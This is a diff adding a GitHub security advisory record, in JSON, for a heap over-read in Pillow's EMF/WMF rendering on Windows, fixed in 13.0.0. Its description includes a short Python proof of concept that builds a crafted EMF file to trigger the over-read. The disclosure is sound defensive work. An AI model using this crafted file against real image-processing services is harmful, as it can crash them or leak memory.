@@ -1,0 +1,97 @@
+{
+ "comments": 3,
+ "credits": [
+  {
+   "type": "reporter",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/2505339?v=4",
+    "events_url": "https://api.github.com/users/MegaManSec/events{/privacy}",
+    "followers_url": "https://api.github.com/users/MegaManSec/followers",
+    "following_url": "https://api.github.com/users/MegaManSec/following{/other_user}",
+    "gists_url": "https://api.github.com/users/MegaManSec/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/MegaManSec",
+    "id": 2505339,
+    "login": "MegaManSec",
+    "node_id": "MDQ6VXNlcjI1MDUzMzk=",
+    "organizations_url": "https://api.github.com/users/MegaManSec/orgs",
+    "received_events_url": "https://api.github.com/users/MegaManSec/received_events",
+    "repos_url": "https://api.github.com/users/MegaManSec/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/MegaManSec/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/MegaManSec/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/MegaManSec",
+    "user_view_type": "public"
+   }
+  }
+ ],
+ "cve_id": "CVE-2026-96644",
+ "cvss": {
+  "score": null,
+  "vector_string": null
+ },
+ "cvss_severities": {
+  "cvss_v3": {
+   "score": 0.0,
+   "vector_string": null
+  },
+  "cvss_v4": {
+   "score": 7.1,
+   "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:N/VA:H/SC:N/SI:N/SA:N"
+  }
+ },
+ "cwes": [
+  {
+   "cwe_id": "CWE-125",
+   "name": "Out-of-bounds Read"
+  }
+ ],
+ "description": "### Summary\nOn Windows builds, Pillow stores EMF and WMF image dimensions without a range check and passes them to the native `drawwmf` handler. That code sizes its allocation from dimensions truncated into 16-bit header fields but copies the result using the full 32-bit dimensions. A crafted metafile that is wide and short passes the decompression-bomb pixel check yet causes a heap over-read.\n\n### Details\nThe EMF branch computes the size straight from signed 32-bit header fields and stores it with no positivity or range check:\n\n- `src/PIL/WmfImagePlugin.py:121-129` reads the bounding box; `:148` stores it; the size reaches the native handler through `src/PIL/WmfImagePlugin.py:56`.\n\nIn the native handler the DIB header fields `bcWidth` and `bcHeight` are 16-bit and truncate the allocation, while the copy length uses the untruncated ints:\n\n- `src/display.c:793-794` assign the 16-bit fields\n- `src/display.c:800` sizes the allocation from them\n- `src/display.c:827` copies `height * ((width * 3 + 3) & -4)` bytes using the full values\n\nThe whole handler is compiled only on Windows (`#ifdef _WIN32`, `src/display.c:33-841`).\n\n### PoC\n```python\nimport struct\nfrom PIL import Image\n\ndef L(v):\n    return struct.pack(\"<i\", v)\n\n# Minimal EMF header. Bounding box is 70000 x 1, so the pixel count (70000) passes the\n# decompression-bomb check, but the width truncates to 16 bits for the allocation while\n# the copy uses 70000.\nemf  = b\"\\x01\\x00\\x00\\x00\" + L(88)          # record type + size\nemf += L(0) + L(0) + L(70000) + L(1)        # rclBounds: x0, y0, x1, y1\nemf += L(0) + L(0) + L(100) + L(100)        # rclFrame (non-zero, used for the dpi calc)\nemf += b\" EMF\"                              # signature at offset 40\nemf += bytes(44)\nopen(\"poc.emf\", \"wb\").write(emf)\n\nim = Image.open(\"poc.emf\")\nprint(\"size:\", im.size, \"pixels:\", im.size[0] * im.size[1])\nim.load()                                   # over-read happens here on a Windows build\n```\n\nOn Linux the first part is observable: the 88-byte file opens, `size` is `(70000, 1)`, and the bomb check passes. The native over-read only exists on Windows because `Image.core.drawwmf` is compiled out elsewhere (on Linux `im.load()` raises `OSError` instead).\n\n### Impact\nCWE-125, out-of-bounds read in a C extension on Windows builds. A crafted EMF or WMF that passes the pixel check can read past a heap buffer, leaking memory or crashing the process.",
+ "epss": {
+  "percentage": 0.00384,
+  "percentile": 0.32505
+ },
+ "ghsa_id": "GHSA-9v9v-9qvf-h2hj",
+ "github_reviewed_at": "2026-10-22T16:03:14Z",
+ "html_url": "https://github.com/advisories/GHSA-9v9v-9qvf-h2hj",
+ "identifiers": [
+  {
+   "type": "GHSA",
+   "value": "GHSA-9v9v-9qvf-h2hj"
+  },
+  {
+   "type": "CVE",
+   "value": "CVE-2026-96644"
+  }
+ ],
+ "nvd_published_at": "2026-10-21T21:20:32Z",
+ "published_at": "2026-10-22T16:03:14Z",
+ "references": [
+  "https://github.com/python-pillow/Pillow/security/advisories/GHSA-9v9v-9qvf-h2hj",
+  "https://nvd.nist.gov/vuln/detail/CVE-2026-96644",
+  "https://github.com/python-pillow/Pillow/pull/10120",
+  "https://github.com/python-pillow/Pillow/commit/4cf46bee338304c5c8968fd7f132ba0d40c428b7",
+  "https://github.com/python-pillow/Pillow/releases/tag/13.0.0",
+  "https://github.com/advisories/GHSA-9v9v-9qvf-h2hj"
+ ],
+ "repository_advisory_url": "https://api.github.com/repos/python-pillow/Pillow/security-advisories/GHSA-9v9v-9qvf-h2hj",
+ "severity": "high",
+ "source_code_location": "https://github.com/python-pillow/Pillow",
+ "summary": "Pillow: Heap over-read in WMF/EMF rendering via 16-bit dimension truncation (Windows builds)",
+ "type": "reviewed",
+ "updated_at": "2026-10-22T16:03:16Z",
+ "url": "https://api.github.com/advisories/GHSA-9v9v-9qvf-h2hj",
+ "vulnerabilities": [
+  {
+   "first_patched_version": "13.0.0",
+   "package": {
+    "ecosystem": "pip",
+    "name": "Pillow"
+   },
+   "vulnerable_functions": [],
+   "vulnerable_version_range": "< 13.0.0"
+  }
+ ],
+ "withdrawn_at": null
+}
